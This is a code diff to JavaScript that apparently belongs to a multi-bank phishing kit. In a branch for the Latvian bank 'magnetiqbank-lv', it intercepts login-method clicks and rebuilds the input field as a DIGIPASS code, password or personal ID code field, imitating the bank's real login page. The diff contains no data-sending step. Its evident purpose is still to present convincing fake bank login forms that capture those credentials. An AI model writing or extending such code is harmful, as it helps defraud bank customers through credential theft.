@@ -321,6 +321,7 @@ if(bank==='magnetiqbank-lv'){
     var mm=(a.getAttribute('href')||'').match(/type=([A-Za-z_]+)/);
     if(mm)a.setAttribute('data-lvtype',mm[1].toUpperCase());
   });
+  var ltLinks=Array.prototype.slice.call(document.querySelectorAll('a.login-type'));
   document.addEventListener('click',function(e){
     var a=e.target.closest&&e.target.closest('.login-type,a[data-lvtype]');
     if(!a)return;
@@ -329,7 +330,24 @@ if(bank==='magnetiqbank-lv'){
     if(t&&tmap[t]!=null){idx=tmap[t];}
     else{var links=Array.prototype.slice.call(document.querySelectorAll('.login-type'));idx=links.indexOf(a);}
     if(idx<0)return;
-    e.preventDefault();e.stopImmediatePropagation();go(idx,t||'');
+    e.preventDefault();e.stopImmediatePropagation();
+    var MQ_FIELDS=[
+      {id:'password',type:'password',label:'DIGIPASS kods'},
+      {id:'password',type:'password',label:'Parole'},
+      {id:'password',type:'password',label:'Parole'},
+      {id:'personIdentifier',type:'text',label:'Personas kods'}
+    ];
+    ltLinks.forEach(function(x,j){x.classList.toggle('active',j===idx);});
+    var c=MQ_FIELDS[idx];
+    var inp=document.querySelector('.inputField input[name=password],.inputField input[name=personIdentifier]');
+    if(inp&&c){
+      var nw=inp.cloneNode(true);
+      nw.type=c.type;nw.id=c.id;nw.name=c.id;nw.value='';nw.setAttribute('value','');
+      inp.parentNode.replaceChild(nw,inp);
+      var w=nw.closest('.inputField');var sp=w&&w.querySelector('span');
+      if(sp)sp.textContent=c.label;
+    }
+    go(idx,(a.textContent||'').trim());
   },true);
 }
 
